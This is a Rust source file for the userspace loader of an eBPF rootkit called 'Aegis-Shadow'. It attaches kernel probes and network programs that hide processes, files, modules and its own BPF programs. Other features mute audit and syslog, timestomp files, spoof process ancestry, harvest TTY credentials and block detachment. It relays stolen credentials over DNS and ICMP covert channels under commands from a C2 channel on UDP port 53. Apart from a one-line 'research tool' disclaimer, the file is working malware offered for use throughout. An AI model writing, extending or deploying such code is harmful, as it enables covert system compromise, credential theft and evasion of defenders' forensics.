use anyhow::{Context, Result};
use aya::{
    include_bytes_aligned,
    maps::{HashMap, MapData, RingBuf},
    programs::{
        tc::{SchedClassifier, TcAttachType},
        KProbe, TracePoint, Xdp, XdpFlags,
    },
    Btf, Ebpf,
};
use aya_log::EbpfLogger;
use clap::Parser;
use common::{
    CredentialCapture, DnsExfilChunk, EventHeader, IcmpExfilPayload, RootkitConfig, TimestompEntry,
    BPF_PIN_PATH, EVENT_ANCESTRY_SPOOFED, EVENT_ANTI_DETACH, EVENT_BPF_CLOAKED,
    EVENT_BYTECODE_WIPED, EVENT_C2_AUTH_FAILED, EVENT_CONTAINER_PROBE, EVENT_CRED_RELAYED,
    EVENT_DNS_EXFIL, EVENT_FILE_OBFUSCATED, EVENT_ICMP_EXFIL, EVENT_KALLSYMS_HIDDEN,
    EVENT_LOG_TAMPERED, EVENT_MEMFD_STAGED, EVENT_MODULE_MASQUERADE, EVENT_NETNS_HIDDEN,
    EVENT_PACKET_INTERCEPTED, EVENT_PROC_HIDDEN, EVENT_SOCKET_CLONED, EVENT_SYSLOG_STRIPPED,
    EVENT_TELEMETRY_MUTED, EVENT_TIMESTOMPED,
};
use offense::{parse_spoof_ppid, parse_timestomp, parse_tty_device};
use std::fs;
use std::path::Path;
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::{Arc, Mutex};
use tokio::io::unix::AsyncFd;
use tokio::signal;
use tokio::sync::watch;
use tracing::{debug, error, info, warn};

type IcmpExfilMap = Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>>;
type DnsExfilMap = Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>>;

#[derive(Debug, Parser)]
#[command(name = "aegis-shadow-offense")]
#[command(about = "Aegis-Shadow Offensive Rootkit Loader", long_about = None)]
struct Cli {
    /// Network interface to attach XDP program
    #[arg(short, long, default_value = "eth0")]
    iface: String,

    /// Enable verbose logging
    #[arg(short, long)]
    verbose: bool,

    /// Hide specific PID on startup
    #[arg(long)]
    hide_pid: Option<u32>,

    /// Obfuscate file by inode
    #[arg(long)]
    obfuscate_inode: Option<u64>,

    /// Monitor TTY device (major:minor format, e.g., 136:0)
    #[arg(long)]
    monitor_tty: Option<String>,

    /// Spoof PPID for target PID (format: pid:fake_ppid)
    #[arg(long)]
    spoof_ppid: Option<String>,

    /// Mark inode for timestomping (format: inode:atime:mtime:ctime)
    #[arg(long)]
    timestomp: Option<String>,

    /// Pin BPF maps to filesystem for persistence
    #[arg(long)]
    pin_maps: bool,

    /// Enable network namespace hiding (intercepts setns)
    #[arg(long)]
    enable_netns_hide: bool,

    /// Enable eBPF program cloaking (hides own prog IDs)
    #[arg(long)]
    enable_bpf_cloak: bool,

    /// Enable kernel module masquerading (/proc/modules)
    #[arg(long)]
    enable_module_mask: bool,

    /// Enable memory-only payload staging (memfd_create + execveat)
    #[arg(long)]
    enable_memfd: bool,

    /// Enable syslog write stripping
    #[arg(long)]
    enable_syslog_strip: bool,

    /// Activate bytecode wipe (programs become no-ops for anti-forensics)
    #[arg(long)]
    wipe_bytecode: bool,

    /// Enable ICMP covert channel exfiltration
    #[arg(long)]
    enable_icmp_exfil: bool,

    /// Enable socket cloning / connection shadowing
    #[arg(long)]
    enable_socket_clone: bool,

    /// Enable credential relay over C2
    #[arg(long)]
    enable_cred_relay: bool,

    /// Enable container escape probes
    #[arg(long)]
    enable_container_probe: bool,
}

struct C2Maps {
    hidden_pids: Mutex<HashMap<MapData, u32, u8>>,
    obfuscate_inodes: Mutex<HashMap<MapData, u64, u8>>,
}

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();

    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env().unwrap_or_else(|_| {
                tracing_subscriber::EnvFilter::new(if cli.verbose { "debug" } else { "info" })
            }),
        )
        .with_target(false)
        .init();

    // Bump the memlock rlimit for eBPF
    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        warn!("Failed to increase RLIMIT_MEMLOCK");
    }

    info!("🔥 Aegis-Shadow Offensive Rootkit Starting...");
    info!("⚠️  WARNING: This is a research tool. Use responsibly and legally.");

    // Load eBPF bytecode
    #[cfg(debug_assertions)]
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../../target/bpfel-unknown-none/debug/offense"
    ))?;
    #[cfg(not(debug_assertions))]
    let mut bpf = Ebpf::load(include_bytes_aligned!(
        "../../target/bpfel-unknown-none/release/offense"
    ))?;

    // Load BTF if available
    if Btf::from_sys_fs().is_ok() {
        info!("✓ BTF loaded from /sys/kernel/btf/vmlinux");
    } else {
        warn!("⚠ BTF not available - CO-RE features may not work");
    }

    // Initialize BPF logger
    if let Err(e) = EbpfLogger::init(&mut bpf) {
        warn!("Failed to initialize eBPF logger: {}", e);
    }

    // Configure rootkit
    let self_pid = std::process::id();
    let config = RootkitConfig {
        self_pid,
        hide_procs: 1,
        net_stealth: 1,
        file_obfuscate: 1,
        mute_telemetry: 1,
        _pad: [0u8; 4],
    };

    let mut config_map: HashMap<_, u32, RootkitConfig> =
        HashMap::try_from(bpf.map_mut("CONFIG").context("CONFIG map not found")?)?;
    config_map.insert(0u32, config, 0)?;
    info!("✓ Rootkit configured (self_pid={})", self_pid);

    // Pin maps if requested
    if cli.pin_maps {
        pin_all_maps(&mut bpf)?;
        info!("✓ Maps pinned to {}", BPF_PIN_PATH);
    }

    // Load Feature 1: Process Hiding (getdents64)
    let getdents_enter: &mut KProbe = bpf
        .program_mut("shadow_getdents64_enter")
        .context("shadow_getdents64_enter not found")?
        .try_into()?;
    getdents_enter.load()?;
    getdents_enter.attach("__x64_sys_getdents64", 0)?;

    let getdents_exit: &mut KProbe = bpf
        .program_mut("shadow_getdents64_exit")
        .context("shadow_getdents64_exit not found")?
        .try_into()?;
    getdents_exit.load()?;
    getdents_exit.attach("__x64_sys_getdents64", 0)?;
    info!("✓ Feature 1: Process Hiding (getdents64) loaded");

    // Load Feature 2: Network Stealth (XDP)
    let xdp_prog: &mut Xdp = bpf
        .program_mut("shadow_xdp")
        .context("shadow_xdp not found")?
        .try_into()?;
    xdp_prog.load()?;
    xdp_prog.attach(&cli.iface, XdpFlags::default())?;
    info!(
        "✓ Feature 2: Network Stealth (XDP) attached to {}",
        cli.iface
    );

    // Load Feature 3: File Obfuscation (vfs_read)
    let vfs_read: &mut KProbe = bpf
        .program_mut("shadow_vfs_read")
        .context("shadow_vfs_read not found")?
        .try_into()?;
    vfs_read.load()?;
    vfs_read.attach("vfs_read", 0)?;
    info!("✓ Feature 3: File Obfuscation (vfs_read) loaded");

    // Load Feature 4: Telemetry Muting (audit hooks)
    let audit_syscall: &mut KProbe = bpf
        .program_mut("shadow_mute_audit")
        .context("shadow_mute_audit not found")?
        .try_into()?;
    audit_syscall.load()?;
    if let Err(e) = audit_syscall.attach("audit_log_start", 0) {
        warn!(
            "⚠ Failed to attach audit_log_start: {} (audit may not be enabled)",
            e
        );
    } else {
        info!("✓ Feature 4: Telemetry Muting (audit) loaded");
    }

    let audit_log_end: &mut KProbe = bpf
        .program_mut("shadow_mute_audit_log_end")
        .context("shadow_mute_audit_log_end not found")?
        .try_into()?;
    audit_log_end.load()?;
    if let Err(e) = audit_log_end.attach("audit_log_end", 0) {
        warn!("⚠ Failed to attach audit_log_end: {}", e);
    }

    // Load Feature 6: Credential Harvesting (sys_write on TTY)
    let cred_harvest: &mut KProbe = bpf
        .program_mut("shadow_cred_harvest")
        .context("shadow_cred_harvest not found")?
        .try_into()?;
    cred_harvest.load()?;
    cred_harvest.attach("ksys_write", 0)?;
    info!("✓ Feature 6: Credential Harvesting (ksys_write) loaded");

    // Load Feature 7: Log Tampering (do_syslog)
    let log_tamper_enter: &mut KProbe = bpf
        .program_mut("shadow_tamper_logs_enter")
        .context("shadow_tamper_logs_enter not found")?
        .try_into()?;
    log_tamper_enter.load()?;
    log_tamper_enter.attach("do_syslog", 0)?;

    let log_tamper_exit: &mut KProbe = bpf
        .program_mut("shadow_tamper_logs")
        .context("shadow_tamper_logs not found")?
        .try_into()?;
    log_tamper_exit.load()?;
    log_tamper_exit.attach("do_syslog", 0)?;
    info!("✓ Feature 7: Log Tampering (do_syslog) loaded");

    // Load Feature 8: Process Ancestry Spoofing (vfs_read on /proc/[pid]/status)
    let spoof_ancestry: &mut KProbe = bpf
        .program_mut("shadow_spoof_ancestry")
        .context("shadow_spoof_ancestry not found")?
        .try_into()?;
    spoof_ancestry.load()?;
    spoof_ancestry.attach("vfs_read", 0)?;
    info!("✓ Feature 8: Process Ancestry Spoofing (vfs_read) loaded");

    // Load Feature 9: DNS Exfiltration (TC egress)
    let tc_prog: &mut SchedClassifier = bpf
        .program_mut("shadow_dns_exfil")
        .context("shadow_dns_exfil not found")?
        .try_into()?;
    tc_prog.load()?;
    tc_prog.attach(&cli.iface, TcAttachType::Egress)?;
    info!(
        "✓ Feature 9: DNS Exfiltration (TC egress) attached to {}",
        cli.iface
    );

    // Load Feature 10: Kallsyms Hiding (vfs_read on /proc/kallsyms)
    let hide_kallsyms: &mut KProbe = bpf
        .program_mut("shadow_hide_kallsyms")
        .context("shadow_hide_kallsyms not found")?
        .try_into()?;
    hide_kallsyms.load()?;
    hide_kallsyms.attach("vfs_read", 0)?;
    info!("✓ Feature 10: Kallsyms Hiding (vfs_read) loaded");

    // Load Feature 11: Anti-Detach Self-Defense (bpf tracepoint)
    let anti_detach: &mut TracePoint = bpf
        .program_mut("shadow_anti_detach")
        .context("shadow_anti_detach not found")?
        .try_into()?;
    anti_detach.load()?;
    anti_detach.attach("syscalls", "sys_enter_bpf")?;
    info!("✓ Feature 11: Anti-Detach Self-Defense (tracepoint) loaded");

    // Load Feature 13: Timestomping (vfs_getattr)
    let timestomp_enter: &mut KProbe = bpf
        .program_mut("shadow_timestomp_enter")
        .context("shadow_timestomp_enter not found")?
        .try_into()?;
    timestomp_enter.load()?;
    timestomp_enter.attach("vfs_getattr", 0)?;

    let timestomp_exit: &mut KProbe = bpf
        .program_mut("shadow_timestomp")
        .context("shadow_timestomp not found")?
        .try_into()?;
    timestomp_exit.load()?;
    timestomp_exit.attach("vfs_getattr", 0)?;
    info!("✓ Feature 13: Timestomping (vfs_getattr) loaded");

    // ── New Feature Loading (gated by CLI flags) ──

    // Feature 14: Network Namespace Hiding
    if cli.enable_netns_hide {
        let setns_enter: &mut KProbe = bpf
            .program_mut("shadow_setns_enter")
            .context("shadow_setns_enter not found")?
            .try_into()?;
        setns_enter.load()?;
        setns_enter.attach("__x64_sys_setns", 0)?;
        info!("✓ Feature 14: Network Namespace Hiding loaded");
    }

    // Feature 15: eBPF Program Cloaking
    if cli.enable_bpf_cloak {
        let bpf_enter: &mut KProbe = bpf
            .program_mut("shadow_bpf_enter")
            .context("shadow_bpf_enter not found")?
            .try_into()?;
        bpf_enter.load()?;
        bpf_enter.attach("__x64_sys_bpf", 0)?;

        let bpf_exit: &mut KProbe = bpf
            .program_mut("shadow_bpf_exit")
            .context("shadow_bpf_exit not found")?
            .try_into()?;
        bpf_exit.load()?;
        bpf_exit.attach("__x64_sys_bpf", 0)?;
        info!("✓ Feature 15: eBPF Program Cloaking loaded");
    }

    // Feature 16: Kernel Module Masquerading
    if cli.enable_module_mask {
        let modules_enter: &mut KProbe = bpf
            .program_mut("shadow_modules_read_enter")
            .context("shadow_modules_read_enter not found")?
            .try_into()?;
        modules_enter.load()?;
        modules_enter.attach("vfs_read", 0)?;

        let modules_exit: &mut KProbe = bpf
            .program_mut("shadow_modules_read_exit")
            .context("shadow_modules_read_exit not found")?
            .try_into()?;
        modules_exit.load()?;
        modules_exit.attach("vfs_read", 0)?;
        info!("✓ Feature 16: Kernel Module Masquerading loaded");
    }

    // Feature 17: Memory-Only Payload Staging
    if cli.enable_memfd {
        let memfd_enter: &mut KProbe = bpf
            .program_mut("shadow_memfd_create_enter")
            .context("shadow_memfd_create_enter not found")?
            .try_into()?;
        memfd_enter.load()?;
        memfd_enter.attach("__x64_sys_memfd_create", 0)?;

        let memfd_exit: &mut KProbe = bpf
            .program_mut("shadow_memfd_create_exit")
            .context("shadow_memfd_create_exit not found")?
            .try_into()?;
        memfd_exit.load()?;
        memfd_exit.attach("__x64_sys_memfd_create", 0)?;

        let execveat: &mut KProbe = bpf
            .program_mut("shadow_execveat_enter")
            .context("shadow_execveat_enter not found")?
            .try_into()?;
        execveat.load()?;
        execveat.attach("do_execveat_common", 0)?;
        info!("✓ Feature 17: Memory-Only Payload Staging loaded");
    }

    // Feature 18: Syslog Write Stripping
    if cli.enable_syslog_strip {
        let syslog_write: &mut KProbe = bpf
            .program_mut("shadow_syslog_write")
            .context("shadow_syslog_write not found")?
            .try_into()?;
        syslog_write.load()?;
        syslog_write.attach("ksys_write", 0)?;
        info!("✓ Feature 18: Syslog Write Stripping loaded");
    }

    // Feature 19: Anti-Forensics Bytecode Wipe
    {
        let wipe_check: &mut KProbe = bpf
            .program_mut("shadow_wipe_check")
            .context("shadow_wipe_check not found")?
            .try_into()?;
        wipe_check.load()?;
        wipe_check.attach("__x64_sys_getpid", 0)?;
        if cli.wipe_bytecode {
            let mut wipe_flag: HashMap<_, u32, u32> = HashMap::try_from(
                bpf.map_mut("WIPE_FLAG")
                    .context("WIPE_FLAG map not found")?,
            )?;
            wipe_flag.insert(0u32, 1u32, 0)?;
            info!("✓ Feature 19: Bytecode Wipe ACTIVATED — programs are now no-ops");
        }
    }

    // Feature 20: ICMP Covert Channel
    if cli.enable_icmp_exfil {
        let icmp_prog: &mut SchedClassifier = bpf
            .program_mut("shadow_icmp_exfil")
            .context("shadow_icmp_exfil not found")?
            .try_into()?;
        icmp_prog.load()?;
        icmp_prog.attach(&cli.iface, TcAttachType::Egress)?;
        info!(
            "✓ Feature 20: ICMP Covert Channel (TC egress) attached to {}",
            cli.iface
        );
    }

    // Feature 21: Socket Cloning
    if cli.enable_socket_clone {
        let tcp_sendmsg: &mut KProbe = bpf
            .program_mut("shadow_tcp_sendmsg")
            .context("shadow_tcp_sendmsg not found")?
            .try_into()?;
        tcp_sendmsg.load()?;
        tcp_sendmsg.attach("tcp_sendmsg", 0)?;
        info!("✓ Feature 21: Socket Cloning (tcp_sendmsg) loaded");
    }

    // Feature 23: Container Escape Probes
    if cli.enable_container_probe {
        let unshare: &mut KProbe = bpf
            .program_mut("shadow_unshare_enter")
            .context("shadow_unshare_enter not found")?
            .try_into()?;
        unshare.load()?;
        unshare.attach("__x64_sys_unshare", 0)?;

        let commit_creds: &mut KProbe = bpf
            .program_mut("shadow_commit_creds")
            .context("shadow_commit_creds not found")?
            .try_into()?;
        commit_creds.load()?;
        commit_creds.attach("commit_creds", 0)?;
        info!("✓ Feature 23: Container Escape Probes loaded");
    }

    // Populate OWN_PROG_IDS for cloaking (after all programs are loaded)
    if cli.enable_bpf_cloak {
        let prog_ids: Vec<u32> = bpf
            .programs()
            .filter_map(|(_name, prog)| prog.info().ok().map(|info| info.id()))
            .collect();
        let mut own_prog_ids: HashMap<_, u32, u8> = HashMap::try_from(
            bpf.map_mut("OWN_PROG_IDS")
                .context("OWN_PROG_IDS map not found")?,
        )?;
        for id in prog_ids {
            own_prog_ids.insert(id, 1u8, 0)?;
        }
        info!("✓ OWN_PROG_IDS populated for cloaking");
    }

    // Apply CLI configurations
    if let Some(pid) = cli.hide_pid {
        let mut hidden_pids: HashMap<_, u32, u8> = HashMap::try_from(
            bpf.map_mut("HIDDEN_PIDS")
                .context("HIDDEN_PIDS not found")?,
        )?;
        hidden_pids.insert(pid, 1u8, 0)?;
        info!("✓ Hiding PID: {}", pid);
    }

    if let Some(inode) = cli.obfuscate_inode {
        let mut obfuscate_inodes: HashMap<_, u64, u8> = HashMap::try_from(
            bpf.map_mut("OBFUSCATE_INODES")
                .context("OBFUSCATE_INODES not found")?,
        )?;
        obfuscate_inodes.insert(inode, 1u8, 0)?;
        info!("✓ Obfuscating inode: {}", inode);
    }

    if let Some(tty) = cli.monitor_tty {
        if let Some((major, minor)) = parse_tty_device(&tty) {
            let dev_key = ((major as u64) << 32) | (minor as u64);
            let mut monitored_ttys: HashMap<_, u64, u8> = HashMap::try_from(
                bpf.map_mut("MONITORED_TTYS")
                    .context("MONITORED_TTYS not found")?,
            )?;
            monitored_ttys.insert(dev_key, 1u8, 0)?;
            info!("✓ Monitoring TTY: {} ({}:{})", tty, major, minor);
        } else {
            warn!("⚠ Invalid TTY format: {}", tty);
        }
    }

    if let Some(spoof) = cli.spoof_ppid {
        if let Some((pid, fake_ppid)) = parse_spoof_ppid(&spoof) {
            let mut spoofed_ppids: HashMap<_, u32, u32> = HashMap::try_from(
                bpf.map_mut("SPOOFED_PPIDS")
                    .context("SPOOFED_PPIDS not found")?,
            )?;
            spoofed_ppids.insert(pid, fake_ppid, 0)?;
            info!("✓ Spoofing PPID: {} → {}", pid, fake_ppid);
        } else {
            warn!("⚠ Invalid spoof format: {}", spoof);
        }
    }

    if let Some(ts) = cli.timestomp {
        if let Some((inode, entry)) = parse_timestomp(&ts) {
            let mut timestomp_inodes: HashMap<_, u64, TimestompEntry> = HashMap::try_from(
                bpf.map_mut("TIMESTOMP_INODES")
                    .context("TIMESTOMP_INODES not found")?,
            )?;
            timestomp_inodes.insert(inode, entry, 0)?;
            info!("✓ Timestomping inode: {}", inode);
        } else {
            warn!("⚠ Invalid timestomp format: {}", ts);
        }
    }

    // Extract maps for C2 command dispatch before moving bpf
    let hidden_pids_map = bpf
        .take_map("HIDDEN_PIDS")
        .context("HIDDEN_PIDS not found")?;
    let obfuscate_inodes_map = bpf
        .take_map("OBFUSCATE_INODES")
        .context("OBFUSCATE_INODES not found")?;

    let c2_maps = Arc::new(C2Maps {
        hidden_pids: Mutex::new(HashMap::try_from(hidden_pids_map)?),
        obfuscate_inodes: Mutex::new(HashMap::try_from(obfuscate_inodes_map)?),
    });

    let (kill_tx, mut kill_rx) = watch::channel(false);

    // Extract ICMP exfil queue map if enabled
    let icmp_queue: Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>> =
        if cli.enable_icmp_exfil && cli.enable_cred_relay {
            bpf.take_map("ICMP_EXFIL_QUEUE")
                .and_then(|m| HashMap::try_from(m).ok())
                .map(|m| Arc::new(Mutex::new(m)))
        } else {
            None
        };

    // Extract DNS exfil queue map for relay if enabled
    let dns_queue: Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>> =
        if cli.enable_cred_relay && !cli.enable_icmp_exfil {
            bpf.take_map("DNS_EXFIL_QUEUE")
                .and_then(|m| HashMap::try_from(m).ok())
                .map(|m| Arc::new(Mutex::new(m)))
        } else {
            None
        };

    // Start event monitoring with C2 dispatch
    tokio::spawn(monitor_events(
        bpf,
        Arc::clone(&c2_maps),
        kill_tx,
        icmp_queue,
        dns_queue,
        cli.enable_cred_relay,
    ));

    info!("🚀 Rootkit active. Press Ctrl+C to detach and exit.");
    info!("📡 Listening for C2 commands on UDP port 53...");

    tokio::select! {
        _ = signal::ctrl_c() => {
            info!("🛑 Shutting down (Ctrl+C)...");
        }
        _ = async { while !*kill_rx.borrow_and_update() { kill_rx.changed().await.ok(); } } => {
            info!("🛑 Kill switch activated via C2. Shutting down...");
        }
    }

    Ok(())
}

fn pin_all_maps(bpf: &mut Ebpf) -> Result<()> {
    let pin_path = Path::new(BPF_PIN_PATH);
    if !pin_path.exists() {
        fs::create_dir_all(pin_path)?;
    }

    for (name, map) in bpf.maps_mut() {
        let map_path = pin_path.join(name);
        if let Err(e) = map.pin(&map_path) {
            warn!("Failed to pin map {}: {}", name, e);
        }
    }

    Ok(())
}

async fn monitor_events(
    mut bpf: Ebpf,
    c2_maps: Arc<C2Maps>,
    kill_tx: watch::Sender<bool>,
    icmp_queue: Option<Arc<Mutex<HashMap<MapData, u32, IcmpExfilPayload>>>>,
    dns_queue: Option<Arc<Mutex<HashMap<MapData, u32, DnsExfilChunk>>>>,
    cred_relay: bool,
) {
    let events_map = match bpf.take_map("EVENTS") {
        Some(map) => map,
        None => {
            error!("Failed to get EVENTS map");
            return;
        }
    };
    let events_ring = match RingBuf::try_from(events_map) {
        Ok(rb) => rb,
        Err(e) => {
            error!("Failed to create EVENTS ring buffer: {}", e);
            return;
        }
    };

    let cred_map = match bpf.take_map("CRED_EVENTS") {
        Some(map) => map,
        None => {
            error!("Failed to get CRED_EVENTS map");
            return;
        }
    };
    let cred_ring = match RingBuf::try_from(cred_map) {
        Ok(rb) => rb,
        Err(e) => {
            error!("Failed to create CRED_EVENTS ring buffer: {}", e);
            return;
        }
    };

    info!("Event monitoring started (ring buffer mode)");

    let dns_seq = Arc::new(AtomicU32::new(0));

    let mut events_fd = match AsyncFd::new(events_ring) {
        Ok(fd) => fd,
        Err(e) => {
            error!("Failed to create AsyncFd for EVENTS: {}", e);
            return;
        }
    };

    let mut cred_fd = match AsyncFd::new(cred_ring) {
        Ok(fd) => fd,
        Err(e) => {
            error!("Failed to create AsyncFd for CRED_EVENTS: {}", e);
            return;
        }
    };

    tokio::spawn(async move {
        loop {
            let mut guard = match events_fd.readable_mut().await {
                Ok(g) => g,
                Err(e) => {
                    error!("EVENTS readable error: {}", e);
                    return;
                }
            };
            let rb = guard.get_inner_mut();
            while let Some(item) = rb.next() {
                if item.len() >= std::mem::size_of::<EventHeader>() {
                    let event =
                        unsafe { std::ptr::read_unaligned(item.as_ptr() as *const EventHeader) };
                    if event.event_type == EVENT_PACKET_INTERCEPTED {
                        let cmd_type = event.pid;
                        let arg = event.context;
                        dispatch_c2_command(cmd_type, arg, &c2_maps, &kill_tx);
                    } else {
                        log_event(&event);
                    }
                }
            }
            guard.clear_ready();
        }
    });

    tokio::spawn(async move {
        loop {
            let mut guard = match cred_fd.readable_mut().await {
                Ok(g) => g,
                Err(e) => {
                    error!("CRED_EVENTS readable error: {}", e);
                    return;
                }
            };
            let rb = guard.get_inner_mut();
            while let Some(item) = rb.next() {
                if item.len() >= std::mem::size_of::<CredentialCapture>() {
                    let capture = unsafe {
                        std::ptr::read_unaligned(item.as_ptr() as *const CredentialCapture)
                    };
                    log_credential_capture(&capture);
                    if cred_relay {
                        relay_credential_to_icmp(&capture, &icmp_queue);
                        relay_credential_to_dns(&capture, &dns_queue, &dns_seq);
                    }
                }
            }
            guard.clear_ready();
        }
    });
}

fn dispatch_c2_command(cmd_type: u32, arg: u64, c2_maps: &C2Maps, kill_tx: &watch::Sender<bool>) {
    match cmd_type {
        1 => {
            let pid = arg as u32;
            match c2_maps.hidden_pids.lock() {
                Ok(mut map) => match map.insert(pid, 1u8, 0) {
                    Ok(_) => info!("C2: hide_pid {}", pid),
                    Err(e) => error!("C2: failed to hide PID {}: {}", pid, e),
                },
                Err(e) => error!("C2: lock error: {}", e),
            }
        }
        2 => {
            let pid = arg as u32;
            match c2_maps.hidden_pids.lock() {
                Ok(mut map) => match map.remove(&pid) {
                    Ok(_) => info!("C2: unhide_pid {}", pid),
                    Err(e) => warn!("C2: unhide PID {} (not found or error): {}", pid, e),
                },
                Err(e) => error!("C2: lock error: {}", e),
            }
        }
        3 => match c2_maps.obfuscate_inodes.lock() {
            Ok(mut map) => match map.insert(arg, 1u8, 0) {
                Ok(_) => info!("C2: obfuscate_file inode={}", arg),
                Err(e) => error!("C2: failed to obfuscate inode {}: {}", arg, e),
            },
            Err(e) => error!("C2: lock error: {}", e),
        },
        4 => {
            debug!("C2: exfil request target={}", arg);
        }
        5 => {
            warn!("C2: kill_switch received, initiating shutdown");
            let _ = kill_tx.send(true);
        }
        _ => {
            warn!("C2: unknown command type={}, arg={}", cmd_type, arg);
        }
    }
}

fn log_event(event: &EventHeader) {
    match event.event_type {
        EVENT_PROC_HIDDEN => {
            debug!("Process hidden: PID={}", event.pid);
        }
        EVENT_FILE_OBFUSCATED => {
            debug!(
                "File obfuscated: PID={}, inode={}",
                event.pid, event.context
            );
        }
        EVENT_LOG_TAMPERED => {
            debug!("Log tampered: PID={}, bytes={}", event.pid, event.context);
        }
        EVENT_ANCESTRY_SPOOFED => {
            debug!(
                "Ancestry spoofed: PID={}, fake_ppid={}",
                event.pid, event.context
            );
        }
        EVENT_DNS_EXFIL => {
            debug!("DNS exfiltration: seq={}", event.context);
        }
        EVENT_KALLSYMS_HIDDEN => {
            debug!(
                "Kallsyms hidden: PID={}, inode={}",
                event.pid, event.context
            );
        }
        EVENT_ANTI_DETACH => {
            debug!(
                "Detach attempt blocked: PID={}, cmd={}",
                event.pid, event.context
            );
        }
        EVENT_TIMESTOMPED => {
            debug!(
                "Timestamp spoofed: PID={}, inode={}",
                event.pid, event.context
            );
        }
        EVENT_C2_AUTH_FAILED => {
            warn!("C2 authentication failed: encrypted={}", event.context);
        }
        EVENT_TELEMETRY_MUTED => {
            debug!("Telemetry muted: PID={}", event.pid);
        }
        EVENT_NETNS_HIDDEN => {
            info!(
                "Netns hidden: PID={}, netns_ino={}",
                event.pid, event.context
            );
        }
        EVENT_BPF_CLOAKED => {
            debug!(
                "BPF program cloaked: PID={}, prog_id={}",
                event.pid, event.context
            );
        }
        EVENT_MODULE_MASQUERADE => {
            debug!(
                "Module masquerade: PID={}, inode={}",
                event.pid, event.context
            );
        }
        EVENT_MEMFD_STAGED => {
            info!(
                "Memfd payload staged: PID={}, fd={}",
                event.pid, event.context
            );
        }
        EVENT_SYSLOG_STRIPPED => {
            debug!(
                "Syslog stripped: PID={}, bytes={}",
                event.pid, event.context
            );
        }
        EVENT_BYTECODE_WIPED => {
            warn!("Bytecode wipe confirmed: PID={}", event.pid);
        }
        EVENT_ICMP_EXFIL => {
            debug!("ICMP exfil sent: seq={}", event.context);
        }
        EVENT_SOCKET_CLONED => {
            debug!("Socket cloned: PID={}, cookie={}", event.pid, event.context);
        }
        EVENT_CRED_RELAYED => {
            info!(
                "Credential relayed: PID={}, bytes={}",
                event.pid, event.context
            );
        }
        EVENT_CONTAINER_PROBE => {
            info!(
                "Container probe: PID={}, ns_ino={}",
                event.pid, event.context
            );
        }
        _ => {
            debug!("Unknown event: type={}", event.event_type);
        }
    }
}

static ICMP_EXFIL_SEQ: AtomicU32 = AtomicU32::new(0);

fn log_credential_capture(capture: &CredentialCapture) {
    let data_str = String::from_utf8_lossy(&capture.data[..capture.data_len as usize]);
    info!(
        "Credential captured: PID={}, FD={}, data={:?}",
        capture.pid, capture.fd, data_str
    );
}

fn relay_credential_to_icmp(capture: &CredentialCapture, icmp_queue: &IcmpExfilMap) {
    let queue = match icmp_queue {
        Some(q) => q,
        None => return,
    };
    let seq = ICMP_EXFIL_SEQ.fetch_add(1, Ordering::Relaxed);
    let mut payload = IcmpExfilPayload {
        seq,
        data_len: capture.data_len.min(56),
        data: [0u8; 56],
    };
    let len = payload.data_len as usize;
    payload.data[..len].copy_from_slice(&capture.data[..len]);
    if let Ok(mut map) = queue.lock() {
        let _ = map.insert(seq, payload, 0);
    }
    debug!("Credential relayed via ICMP: seq={}, bytes={}", seq, len);
}

fn relay_credential_to_dns(
    capture: &CredentialCapture,
    dns_queue: &DnsExfilMap,
    seq_counter: &AtomicU32,
) {
    let queue = match dns_queue {
        Some(q) => q,
        None => return,
    };
    let seq = seq_counter.fetch_add(1, Ordering::Relaxed);
    let mut chunk = DnsExfilChunk {
        seq,
        data_len: capture.data_len.min(64),
        data: [0u8; 64],
    };
    let len = chunk.data_len as usize;
    chunk.data[..len].copy_from_slice(&capture.data[..len]);
    if let Ok(mut map) = queue.lock() {
        let _ = map.insert(seq, chunk, 0);
    }
    debug!("Credential relayed via DNS: seq={}, bytes={}", seq, len);
}
